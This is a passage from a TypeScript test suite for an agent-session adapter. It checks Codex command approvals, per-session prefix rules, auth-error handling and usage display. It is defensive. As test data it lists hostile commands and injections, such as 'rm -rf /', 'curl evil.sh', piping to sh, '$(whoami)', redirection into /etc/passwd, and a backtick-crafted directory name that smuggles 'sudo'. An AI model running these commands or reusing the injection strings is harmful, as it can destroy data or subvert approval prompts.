    const resp = fireExecApproval(fake, "bad-1", "rg --files sub", [
      "rg",
      "--files",
      "sub",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    // Answering an approval must never grant a rule about a DIFFERENT command.
    await session.approve("bad-1", {
      kind: "allow_prefix",
      prefixText: "rm -rf",
    });
    expect(await resp).toEqual({ decision: "accept" });
    const refused = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(refused.text).toBe(
      "`rm -rf` is not the start of the command being approved, so no session rule was added - this command was allowed once.",
    );
    // Nothing was stored: neither the rejected rule nor the command itself.
    ignoreUnanswered(
      fireExecApproval(fake, "bad-2", "rm -rf sub", ["rm", "-rf", "sub"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("bad-2");
  });

  it("a command that isn't plain argv offers no option 4 at all", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    // Codex suggests a rule for the first segment of a chained command. No
    // rule could ever cover the whole thing, so rather than offering an
    // option that is guaranteed to be refused, we don't offer one - and an
    // allow_prefix arriving anyway is just a one-shot allow, silently.
    const resp = fireExecApproval(fake, "chain-1", "rg --files sub && curl x", [
      "rg",
      "--files",
    ]);
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBeUndefined();
    expect(ev.allowPrefixExample).toBeUndefined();
    await session.approve("chain-1", {
      kind: "allow_prefix",
      prefixText: "rg --files",
    });
    expect(await resp).toEqual({ decision: "accept" });
    // Nothing stored and nothing said: the next matching command still asks.
    ignoreUnanswered(
      fireExecApproval(fake, "chain-2", "rg --files other", ["rg", "--files"]),
    );
    const ev2 = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev2.approvalId).toBe("chain-2");
  });

  it("a suggestion pointing away from the command is never offered", async () => {
    const { it: stream, fake } = await bootstrapped();
    // The trust-boundary case: the request asks to run one command while
    // proposing a rule about another. Answering "4" must not store that rule.
    ignoreUnanswered(
      fireExecApproval(fake, "side-1", "rg --files sub", ["curl", "evil.sh"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBeUndefined();
  });

  it("rules are per session: a fresh session starts with none", async () => {
    await withGrantedPrefix();
    const { it: stream, fake } = await bootstrapped();
    ignoreUnanswered(
      fireExecApproval(fake, "pfx-8", "rg --files sub", ["rg", "--files"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("pfx-8");
  });

  it("matching is by whole tokens, so `rg` never covers `rgrep`", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    const resp = fireExecApproval(fake, "tok-1", "rg --files sub", [
      "rg",
      "--files",
      "sub",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("tok-1", { kind: "allow_prefix", prefixText: "rg" });
    expect(await resp).toEqual({ decision: "accept" });
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    ignoreUnanswered(
      fireExecApproval(fake, "tok-2", "rgrep --files sub", ["rgrep"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("tok-2");
  });

  it("a rule longer than the command doesn't match it", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    const resp = fireExecApproval(fake, "long-1", "cargo test --lib", [
      "cargo",
      "test",
      "--lib",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("long-1", { kind: "allow_prefix" });
    expect(await resp).toEqual({ decision: "accept" });
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    // "cargo test" is a PREFIX of the rule, not covered BY it.
    ignoreUnanswered(
      fireExecApproval(fake, "long-2", "cargo test", ["cargo", "test"]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("long-2");
  });

  it("several rules coexist, and a narrower one is dropped as redundant", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    // Rule 1: cargo test
    const r1 = fireExecApproval(fake, "many-1", "cargo test --lib", [
      "cargo",
      "test",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("many-1", { kind: "allow_prefix" });
    await r1;
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    // Rule 2: rg --files, a different family entirely.
    const r2 = fireExecApproval(fake, "many-2", "rg --files sub", [
      "rg",
      "--files",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("many-2", { kind: "allow_prefix" });
    await r2;
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    // Both families now run unprompted.
    const a = fireExecApproval(fake, "many-3", "cargo test --doc", null);
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    expect(await a).toEqual({ decision: "accept" });
    const b = fireExecApproval(fake, "many-4", "rg --files other", null);
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    expect(await b).toEqual({ decision: "accept" });
    // A narrower rule inside an existing one is redundant: the command it
    // would cover is already auto-approved, so it never reaches a prompt.
    const c = fireExecApproval(fake, "many-5", "rg --files sub deep", null);
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    expect(await c).toEqual({ decision: "accept" });
  });

  it("legacy execCommandApproval gets no prefix behaviour at all", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    // Legacy params carry argv + no suggestion, and codex 0.144 doesn't use
    // this method at all - so no option 4, and allow_prefix stores nothing.
    const resp = fake.fireServerRequest({
      id: "leg-1",
      method: "execCommandApproval",
      params: { command: ["rg", "--files", "sub"], cwd: "/work" },
    });
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBeUndefined();
    await session.approve("leg-1", {
      kind: "allow_prefix",
      prefixText: "rg --files",
    });
    expect(await resp).toEqual({ decision: "approved" });
    // Nothing remembered, and nothing said: with no suggestion there was
    // never an option 4 to answer, so it degrades to a plain allow.
    const again = fake.fireServerRequest({
      id: "leg-2",
      method: "execCommandApproval",
      params: { command: ["rg", "--files", "sub"], cwd: "/work" },
    });
    again.catch(() => {});
    const ev2 = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev2.approvalId).toBe("leg-2");
  });

  it("a rule is pinned to the directory it was granted in", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    const resp = fireExecApproval(fake, "cwd-1", "rm -rf build", [
      "rm",
      "-rf",
      "build",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("cwd-1", { kind: "allow_prefix" });
    expect(await resp).toEqual({ decision: "accept" });
    const stored = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    // The confirmation names the directory, because that is part of the grant.
    expect(stored.text).toBe(
      "Allowing any command starting with `rm -rf build` in `/work` for the rest of this session.",
    );
    // Same argv, another tree: a different action, so it asks again.
    ignoreUnanswered(
      fake.fireServerRequest({
        id: "cwd-2",
        method: "item/commandExecution/requestApproval",
        params: {
          ...execApprovalParams("rm -rf build", ["rm", "-rf", "build"]),
          cwd: "/elsewhere",
        },
      }),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.approvalId).toBe("cwd-2");
  });

  it("a directory containing a backtick can't forge the confirmation", async () => {
    const { session, it: stream, fake } = await bootstrapped();
    // cwd is whatever path codex reported - the one value in these lines that
    // isn't grammar-restricted. A crafted one must not close the code span.
    const cwd = "/tmp/x` for the rest of this session. Allowing `sudo";
    const resp = fake.fireServerRequest({
      id: "md-1",
      method: "item/commandExecution/requestApproval",
      params: {
        ...execApprovalParams("rg --files sub", ["rg", "--files"]),
        cwd,
      },
    });
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("md-1", { kind: "allow_prefix" });
    expect(await resp).toEqual({ decision: "accept" });
    const stored = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(stored.text).toBe(
      "Allowing any command starting with `rg --files` in ``" +
        cwd +
        "`` for the rest of this session.",
    );
  });

  it("a suggestion whose tokens aren't plain argv is never offered", async () => {
    const { it: stream, fake } = await bootstrapped();
    // A token carrying whitespace or a backtick would render an ambiguous or
    // broken rule in the prompt, so there is simply no option 4 for it.
    for (const [id, suggestion] of [
      ["odd-1", ["rg", "--files sub"]],
      ["odd-2", ["rg", "`id`"]],
      ["odd-3", ["rg", "*.ts"]],
    ] as const) {
      ignoreUnanswered(
        fireExecApproval(fake, id, "rg --files sub", [...suggestion]),
      );
      const ev = expectKind(
        await nextEvent(stream, "approval_request"),
        "approval_request",
      );
      expect(ev.approvalId).toBe(id);
      expect(ev.allowPrefixLabel).toBeUndefined();
      expect(ev.allowPrefixExample).toBeUndefined();
    }
  });

  it("a one-token suggestion offers no shorter example", async () => {
    const { it: stream, fake } = await bootstrapped();
    ignoreUnanswered(fireExecApproval(fake, "one-1", "whoami", ["whoami"]));
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBe("whoami");
    expect(ev.allowPrefixExample).toBeUndefined();
  });

  it("the example label is the suggestion minus its last token", async () => {
    const { it: stream, fake } = await bootstrapped();
    ignoreUnanswered(
      fireExecApproval(fake, "ex-1", "rg --files sub", [
        "rg",
        "--files",
        "sub",
      ]),
    );
    const ev = expectKind(
      await nextEvent(stream, "approval_request"),
      "approval_request",
    );
    expect(ev.allowPrefixLabel).toBe("rg --files sub");
    expect(ev.allowPrefixExample).toBe("rg --files");
  });

  it("rule notices are marked Isomux-authored so they skip auth sniffing", async () => {
    // The orchestrator scans system_text for provider auth trouble with a
    // regex that includes 401/403. These lines quote commands and rules, so
    // they must never be read that way - a rule about a 401 is not a login.
    const { session, it: stream, fake } = await bootstrapped();
    const resp = fireExecApproval(fake, "auth-1", "grep 401 authentication", [
      "grep",
      "401",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("auth-1", { kind: "allow_prefix" });
    expect(await resp).toEqual({ decision: "accept" });
    const granted = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(granted.text).toContain("401");
    expect(granted.isomuxAuthored).toBe(true);
    // And the auto-approval breadcrumb that follows.
    const next = fireExecApproval(fake, "auth-2", "grep 401 403", null);
    const note = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(note.isomuxAuthored).toBe(true);
    expect(await next).toEqual({ decision: "accept" });
    // The refusal path carries user text too.
    const bad = fireExecApproval(fake, "auth-3", "curl unauthorized", [
      "curl",
      "unauthorized",
    ]);
    expectKind(await nextEvent(stream, "approval_request"), "approval_request");
    await session.approve("auth-3", {
      kind: "allow_prefix",
      prefixText: "not authenticated",
    });
    await bad;
    const refused = expectKind(
      await nextEvent(stream, "system_text"),
      "system_text",
    );
    expect(refused.isomuxAuthored).toBe(true);
  });

  it("an auto-approved request leaves nothing parked for close() to unwind", async () => {
    const { session, it: stream, fake } = await withGrantedPrefix();
    const resp = fireExecApproval(fake, "leak-1", "rg --files sub", null);
    expectKind(await nextEvent(stream, "system_text"), "system_text");
    expect(await resp).toEqual({ decision: "accept" });
    // A leaked pendingApprovals entry would surface here: close() answers
    // every parked approval with a "Session closed" JSON-RPC error.
    session.close();
    expect(fake.errorResponses).toEqual([]);
  });
});

describe("prefix-match helpers", () => {
  it("offerablePrefix only offers a rule that is the start of the command", () => {
    const tokens = (cmd: string) =>
      commandTokensForPrefixMatch(execApprovalParams(cmd, null));
    const params = execApprovalParams("rg --files .", ["rg", "--files"]);
    const V2 = "item/commandExecution/requestApproval";
    expect(offerablePrefix(V2, params, tokens("rg --files ."))).toEqual([
      "rg",
      "--files",
    ]);
    // Only the v2 command-execution method can carry one. Legacy exec is
    // excluded BY METHOD, not by "legacy params happen not to have the
    // field" - a future codex growing one there must not silently light up
    // option 4 on a path nobody designed for it.
    expect(
      offerablePrefix("execCommandApproval", params, tokens("rg --files .")),
    ).toBeNull();
    expect(
      offerablePrefix(
        "item/fileChange/requestApproval",
        params,
        tokens("rg --files ."),
      ),
    ).toBeNull();
    // A command we can't read as plain argv offers nothing - rather than
    // offering an option that could only ever be refused.
    expect(offerablePrefix(V2, params, null)).toBeNull();
    // A suggestion that points somewhere other than the command being
    // approved is the dangerous case: answering "4" about `rg --files .`
    // must never store a rule about `curl`.
    expect(
      offerablePrefix(
        V2,
        { ...params, proposedExecpolicyAmendment: ["curl", "evil.sh"] },
        tokens("rg --files ."),
      ),
    ).toBeNull();
    // Even a plausible-looking sideways suggestion: same program, different
    // flag from the one actually being run.
    expect(
      offerablePrefix(
        V2,
        { ...params, proposedExecpolicyAmendment: ["rg", "--no-ignore"] },
        tokens("rg --files ."),
      ),
    ).toBeNull();
    // Tokens must be plain argv: they are displayed back inside backticks, so
    // whitespace or a backtick could forge or mangle the rule in the prompt.
    for (const amendment of [
      ["rg", "--files sub"],
      ["rg", "`id`"],
      ["rg", "--files\nsub"],
      ["rg", "*.ts"],
      ["rg", ""],
      [],
      ["rg", 7],
    ]) {
      expect(
        offerablePrefix(
          V2,
          { ...params, proposedExecpolicyAmendment: amendment },
          tokens("rg --files ."),
        ),
      ).toBeNull();
    }
  });

  it("commandTokensForPrefixMatch accepts only plain argv", () => {
    // The shapes that DO match: ordinary programs, flags, paths, versions,
    // hosts, key=value args - and runs of spaces are just spacing.
    expect(
      commandTokensForPrefixMatch(execApprovalParams("rg --files sub", null)),
    ).toEqual(["rg", "--files", "sub"]);
    expect(
      commandTokensForPrefixMatch(
        execApprovalParams("rg   --files   ./a/b.txt", null),
      ),
    ).toEqual(["rg", "--files", "./a/b.txt"]);
    expect(
      commandTokensForPrefixMatch(
        execApprovalParams("env FOO=bar cargo test --lib", null),
      ),
    ).toEqual(["env", "FOO=bar", "cargo", "test", "--lib"]);
    // Everything else prompts. This is an allowlist, so the list below is
    // illustrative rather than exhaustive - that is the point of the design.
    for (const command of [
      "rg --files && curl evil.sh", // chaining
      "rg --files; rm -rf /",
      "rg --files | sh", // pipe
      "rg --files $(whoami)", // substitution
      "rg --files > /etc/passwd", // redirection
      "rg --files < in.txt",
      "rg --files `id`", // backticks
      "rg --files 'a b'", // quoting
      'rg --files "a b"',
      "rg --files a\\ b", // escaping
      "rg --files *.ts", // globbing
      "rg --files a?.ts",
      "rg --files [ab].ts",
      "rg --files {a,b}", // brace expansion
      "rg --files ~/secrets", // tilde expansion
      "rg --files # comment", // comment
      "rg --files $HOME", // variable
      "rg --files\tsub", // tab
      "rg --files\nsub", // newline
      "rg --files\rsub", // carriage return
      "rg --files sub\u0007", // control character
      "rg --files ñ", // non-ASCII
      "   ", // nothing but spacing
    ]) {
      expect(
        commandTokensForPrefixMatch(execApprovalParams(command, null)),
      ).toBeNull();
    }
    // Ambiguous or missing action lists are never matched.
    expect(commandTokensForPrefixMatch({ commandActions: [] })).toBeNull();
    expect(
      commandTokensForPrefixMatch({
        commandActions: [{ command: "rg --files" }, { command: "curl x" }],
      }),
    ).toBeNull();
    expect(commandTokensForPrefixMatch({})).toBeNull();
    expect(commandTokensForPrefixMatch({ commandActions: [{}] })).toBeNull();
    expect(
      commandTokensForPrefixMatch({ commandActions: [{ command: 7 }] }),
    ).toBeNull();
    expect(commandTokensForPrefixMatch(null)).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// Auto-declined server requests. v1 can't service these, so each emits a
// breadcrumb and responds with the protocol-correct shape (a wrong response
// shape would break codex's wire). elicitation is the one that returns a value
// rather than a JSON-RPC error, so its response shape is worth freezing.
// ---------------------------------------------------------------------------
describe("CodexSession auto-declined server requests", () => {
  it("mcpServer/elicitation/request -> system_text breadcrumb + decline response", async () => {
    const { fake, it } = await bootstrapped();
    const resp = fake.fireServerRequest({
      id: "elic-1",
      method: "mcpServer/elicitation/request",
      params: {},
    });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toContain("elicitation");
    expect(await resp).toEqual({ action: "decline" });
  });
});

// ---------------------------------------------------------------------------
// Auth coalescing - the representative case (per design review). After
// turn/started, an auth-shaped stderr burst produces exactly ONE system_text,
// triggers exactly ONE best-effort turn/interrupt, and the resulting
// turn_completed is failed + causedByAuth with a non-auth-shaped summary so the
// orchestrator's auth-detect regex does not re-fire.
// ---------------------------------------------------------------------------
describe("CodexSession auth coalescing", () => {
  it("collapses an auth-error stderr burst into one signal + one interrupt + a failed/causedByAuth turn", async () => {
    const { session, fake, it } = await bootstrapped();
    await session.send("do the thing");
    fake.fireNotification("turn/started", { turn: { id: "turn-1" } });

    // First auth-shaped stderr: one system_text + one self-interrupt.
    fake.fireStderr("ERROR: 401 Unauthorized while connecting to OpenAI");
    const sysText = expectKind(
      await nextEvent(it, "auth system_text"),
      "system_text",
    );
    expect(sysText.text).toContain("401");
    expect(fake.interruptCount()).toBe(1);

    // Second auth-shaped stderr in the SAME turn: coalesced, no new system_text.
    fake.fireStderr("ERROR: 401 Unauthorized (retry 2)");

    // The interrupt lands as turn/completed interrupted; the adapter remaps it
    // to failed + causedByAuth. The next stream event being turn_completed (not
    // a second system_text) proves the retry was coalesced.
    fake.fireNotification("turn/completed", {
      turn: { status: "interrupted", error: null },
    });
    const done = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(done.status).toBe("failed");
    expect(done.causedByAuth).toBe(true);
    expect(done.error).toContain("after an auth error");
    // The rewritten summary is NOT auth-shaped, so it won't re-trigger detection.
    expect(done.error).not.toMatch(/401|unauthorized/i);
    expect(fake.interruptCount()).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Subprocess death mid-turn synthesizes a failed turn_completed (invariant: the
// orchestrator's pendingTurn must always unblock).
// ---------------------------------------------------------------------------
describe("CodexSession subprocess exit", () => {
  it("exit mid-turn -> synthesized failed turn_completed", async () => {
    const { session, fake, it } = await bootstrapped();
    await session.send("hi");
    fake.fireNotification("turn/started", { turn: { id: "turn-1" } });
    fake.fireExit(1, null);
    const ev = expectKind(
      await nextEvent(it, "turn_completed"),
      "turn_completed",
    );
    expect(ev.status).toBe("failed");
    expect(ev.error).toContain("exited");
  });
});

// ---------------------------------------------------------------------------
// file_view (imageView). Uses a temp source file (cleaned in afterAll); the
// attachment copy lands under the test's temp STATE_ROOT (preload-managed).
// ---------------------------------------------------------------------------
describe("CodexSession image view", () => {
  it("imageView with a readable file -> file_view attachment", async () => {
    const dir = mkdtempSync(join(tmpdir(), "isomux-codex-img-"));
    tempDirs.push(dir);
    const imgPath = join(dir, "shot.png");
    // Minimal PNG signature bytes - enough for statSync/readFileSync to succeed.
    writeFileSync(imgPath, Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a]));

    const { fake, it } = await bootstrapped();
    fireItem(fake, { type: "imageView", path: imgPath });
    const ev = expectKind(await nextEvent(it, "file_view"), "file_view");
    expect(ev.title).toBe("shot.png");
    expect(ev.attachments).toHaveLength(1);
    expect(ev.attachments[0].originalName).toBe("shot.png");
    expect(ev.attachments[0].mediaType).toContain("image/");
  });

  it("imageView with an unreadable path -> system_text fallback", async () => {
    const { fake, it } = await bootstrapped();
    fireItem(fake, { type: "imageView", path: "/no/such/file/nope.png" });
    const ev = expectKind(await nextEvent(it, "system_text"), "system_text");
    expect(ev.text).toContain("could not display");
  });
});

// ---------------------------------------------------------------------------
// buildCodexUserInput - inbound attachments follow the shared path-notice
// convention (server/attachment-prompt.ts): no localImage, no inlined
// contents, one text item joining one line per resolved attachment. Fixture
// files live under the preload-managed temp STATE_ROOT.
// ---------------------------------------------------------------------------
describe("buildCodexUserInput", () => {
  const AGENT_ID = `test-codex-input-${Date.now()}-${Math.random()
    .toString(36)
    .slice(2, 8)}`;
  const FILES_DIR = join(STATE_ROOT, "logs", AGENT_ID, "files");

  function fixture(filename: string, contents: Buffer | string) {
    mkdirSync(FILES_DIR, { recursive: true });
    writeFileSync(join(FILES_DIR, filename), contents);
  }

  function att(filename: string, mediaType: string, size = 1) {
    return { filename, originalName: filename, mediaType, size };
  }

  afterAll(() => {
    try {
      rmSync(join(STATE_ROOT, "logs", AGENT_ID), {
        recursive: true,
        force: true,
      });
    } catch {}
  });

  it("text only -> single text input", () => {
    expect(buildCodexUserInput("hi", undefined, AGENT_ID)).toEqual([
      { type: "text", text: "hi", text_elements: [] },
    ]);
  });

  it("image attachment -> path-notice text item, NOT localImage", () => {
    fixture("shot.png", Buffer.from([0x89, 0x50]));
    const inputs = buildCodexUserInput(
      "look",
      [att("shot.png", "image/png", 2)],
      AGENT_ID,
    );
    expect(inputs).toHaveLength(2);
    expect(inputs.every((i) => i.type === "text")).toBe(true);
    const notice = inputs[1] as { type: "text"; text: string };
    expect(notice.text).toContain('[Attachment: "shot.png" (image/png,');
    expect(notice.text).toContain(join(FILES_DIR, "shot.png"));
  });

  it("text-file attachment is not inlined; contents stay out", () => {
    fixture("notes.md", "SECRET CONTENTS\n");
    const inputs = buildCodexUserInput(
      "",
      [att("notes.md", "text/markdown", 16)],
      AGENT_ID,
    );
    expect(inputs).toHaveLength(1);
    const notice = inputs[0] as { type: "text"; text: string };
    expect(notice.text).toContain('"notes.md"');
    expect(notice.text).not.toContain("SECRET CONTENTS");
  });

  it("mixed present/missing attachments -> one line each in order, no placeholders", () => {
    fixture("a.pdf", Buffer.from("%PDF"));
    fixture("b.bin", Buffer.from([0]));
    const inputs = buildCodexUserInput(
      "",
      [
        att("a.pdf", "application/pdf"),
        att("missing.txt", "text/plain"),
        att("b.bin", "application/octet-stream"),
      ],
      AGENT_ID,
    );
    expect(inputs).toHaveLength(1);
    const lines = (inputs[0] as { text: string }).text.split("\n");
    expect(lines).toHaveLength(2);
    expect(lines[0]).toContain('"a.pdf"');
    expect(lines[1]).toContain('"b.bin"');
  });

  it("empty text and no resolvable attachments -> single empty text input", () => {
    const inputs = buildCodexUserInput(
      "",
      [att("gone.png", "image/png")],
      AGENT_ID,
    );
    expect(inputs).toEqual([{ type: "text", text: "", text_elements: [] }]);
  });
});

// ---------------------------------------------------------------------------
// Subscription rate limits (the usage pill)
// ---------------------------------------------------------------------------

describe("codex subscription usage", () => {
  const week = { usedPercent: 34.5, windowDurationMins: 10080, resetsAt: null };
  const fiveHour = { usedPercent: 80, windowDurationMins: 300, resetsAt: null };

  // A full RateLimitSnapshot with the fields a test cares about overridden.
  function snapshot(
    over: Partial<Record<string, unknown>> = {},
  ): RateLimitSnapshot {
    return {
      limitId: "codex",
      limitName: null,
      primary: week,
      secondary: null,
      credits: null,
      individualLimit: null,
      planType: "plus",
      rateLimitReachedType: null,
      ...over,
    };
  }

  async function usageOf(session: CodexSession) {
    const r = await session.getSubscriptionUsage();
    if (r.kind !== "usage") throw new Error(`expected usage, got ${r.kind}`);
    return r.usage;
  }

  it("labels windows by duration, not by which slot they arrived in", () => {
    expect(codexWindowLabel(10080)).toBe("Weekly");
    expect(codexWindowLabel(1440)).toBe("Daily");
    expect(codexWindowLabel(300)).toBe("5-hour");
    expect(codexWindowLabel(43200)).toBe("30-day");
    expect(codexWindowLabel(90)).toBe("90-minute");
    expect(codexWindowLabel(null)).toBe("Plan allowance");
  });

  it("reads resetsAt in either epoch unit", () => {
    // Codex sends seconds today (the reference script feeds it straight to
    // datetime.fromtimestamp) but the generated schema only promises a number.
    expect(codexResetsAtMs(1785000000)).toBe(1785000000000);
    expect(codexResetsAtMs(1785000000000)).toBe(1785000000000);
    expect(codexResetsAtMs(null)).toBeNull();
    expect(codexResetsAtMs(0)).toBeNull();
    expect(codexResetsAtMs("soon")).toBeNull();
  });

  it("normalizes a snapshot into display order, longest window first", () => {
    // primary/secondary slot meaning has moved across codex versions, so the
    // ordering is derived from the durations, never from the slot.
    const out = normalizeCodexSubscriptionUsage(
      snapshot({ primary: fiveHour, secondary: week }),
    );
    expect(out).toEqual({
      kind: "usage",
      usage: {
        plan: "plus",
        windows: [
          { label: "Weekly", usedPercent: 34.5, resetsAtMs: null },
          { label: "5-hour", usedPercent: 80, resetsAtMs: null },
        ],
      },
    });
  });

  it("clamps out-of-range percentages at the wire boundary", () => {
    const out = normalizeCodexSubscriptionUsage(
      snapshot({
        primary: { ...week, usedPercent: 130 },
        secondary: { ...fiveHour, usedPercent: -4 },
      }),
    );
    expect(out).toEqual({
      kind: "usage",
      usage: {
        plan: "plus",
        windows: [
          { label: "Weekly", usedPercent: 100, resetsAtMs: null },
          { label: "5-hour", usedPercent: 0, resetsAtMs: null },
        ],
      },
    });
  });

  it("separates 'nothing to report' from 'nothing asked yet'", () => {
    // A snapshot with no usable window is an answer: clear the pill.
    expect(
      normalizeCodexSubscriptionUsage(
        snapshot({ primary: null, secondary: null }),
      ),
    ).toEqual({ kind: "unavailable" });
    // No snapshot at all is not an answer.
    expect(normalizeCodexSubscriptionUsage(null)).toEqual({ kind: "unknown" });
  });

  it("serves pushed rate limits without issuing a read request", async () => {
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot(),
    });
    const usage = await usageOf(session);
    expect(usage.plan).toBe("plus");
    expect(usage.windows[0]).toEqual({
      label: "Weekly",
      usedPercent: 34.5,
      resetsAtMs: null,
    });
    expect(
      fake.requests.some((r) => r.method === "account/rateLimits/read"),
    ).toBe(false);
  });

  it("merges sparse updates instead of letting a null clear a known value", async () => {
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({ secondary: fiveHour }),
    });
    // A rolling update carrying only a fresher weekly number: the plan and the
    // 5-hour window are "not included", NOT "gone".
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: "codex",
        primary: { ...week, usedPercent: 41 },
        secondary: null,
        planType: null,
      }),
    });
    const usage = await usageOf(session);
    expect(usage.plan).toBe("plus");
    expect(usage.windows.map((w) => w.usedPercent)).toEqual([41, 80]);
  });

  it("merges window FIELDS, so a percentage-only update keeps duration and reset", async () => {
    // The sparse rule is recursive. Replacing the whole window on every push
    // would drop windowDurationMins - and with it the label, which is derived
    // from the duration - the first time codex sent a bare percentage.
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        primary: {
          usedPercent: 34.5,
          windowDurationMins: 10080,
          resetsAt: 1785000000,
        },
      }),
    });
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        primary: { usedPercent: 41, windowDurationMins: null, resetsAt: null },
      }),
    });
    const usage = await usageOf(session);
    expect(usage.windows[0]).toEqual({
      label: "Weekly",
      usedPercent: 41,
      resetsAtMs: 1785000000000,
    });
  });

  it("keeps separate metered buckets apart and prefers the codex one", async () => {
    // A business account can meter more than one thing; blending two meters
    // would invent a number that describes neither.
    const { session, fake } = await bootstrapped();
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({
        limitId: "some-other-meter",
        primary: { ...week, usedPercent: 3 },
        planType: "business",
      }),
    });
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({ limitId: "codex", planType: "business" }),
    });
    const usage = await usageOf(session);
    expect(usage.windows[0].usedPercent).toBe(34.5);
  });

  it("falls back to one account/rateLimits/read before anything was pushed", async () => {
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      rateLimits: snapshot({ limitId: null, planType: "pro" }),
      rateLimitsByLimitId: null,
      rateLimitResetCredits: null,
    };
    const { session } = await bootstrapped(fake);
    expect((await usageOf(session)).plan).toBe("pro");
    // Cached now: a second call is served locally.
    await session.getSubscriptionUsage();
    expect(
      fake.requests.filter((r) => r.method === "account/rateLimits/read")
        .length,
    ).toBe(1);
  });

  it("ingests the keyed buckets from a read, not just the legacy view", async () => {
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      // Historical single-bucket view describes a different meter here.
      rateLimits: snapshot({
        limitId: "legacy-meter",
        primary: { ...week, usedPercent: 2 },
      }),
      rateLimitsByLimitId: {
        codex: snapshot({ primary: { ...week, usedPercent: 77 } }),
      },
      rateLimitResetCredits: null,
    };
    const { session } = await bootstrapped(fake);
    expect((await usageOf(session)).windows[0].usedPercent).toBe(77);
  });

  it("lets a notification that lands mid-read win over the read's baseline", async () => {
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      rateLimits: snapshot({ primary: { ...week, usedPercent: 10 } }),
      rateLimitsByLimitId: null,
      rateLimitResetCredits: null,
    };
    fake.holdRateLimitsRead = true;
    const { session } = await bootstrapped(fake);
    const pending = session.getSubscriptionUsage();
    // The read is issued after bootstrap resolves, so wait for it to be in
    // flight before racing a notification against it.
    for (let i = 0; i < 200 && !fake.rateLimitsReadParked(); i++) {
      await new Promise((r) => setTimeout(r, 5));
    }
    expect(fake.rateLimitsReadParked()).toBe(true);
    // Fresher data arrives while the read is still in flight.
    fake.fireNotification("account/rateLimits/updated", {
      rateLimits: snapshot({ primary: { ...week, usedPercent: 55 } }),
    });
    fake.releaseRateLimitsRead();
    const result = await pending;
    expect(result.kind).toBe("usage");
    expect((await usageOf(session)).windows[0].usedPercent).toBe(55);
  });

  it("lets a late read fill metadata a sparse push left null, without undoing it", async () => {
    // Sparse-first ordering: a percentage-only notification creates the bucket
    // while the read is still out. Skipping the read wholesale for an existing
    // key (the first version of this) meant the window's duration - and so its
    // label and reset time - never arrived.
    const fake = new FakeCodexTransport();
    fake.rateLimitsReadResponse = {
      rateLimits: snapshot({
        primary: {
          usedPercent: 10,
          windowDurationMins: 10080,
          resetsAt: 1785000000,
        },
      }),
      rateLimitsByLimitId: null,
      rateLimitResetCredits: null,
    };
    fake.holdRateLimitsRead = true;
    const { session } = await bootstrapped(fake);
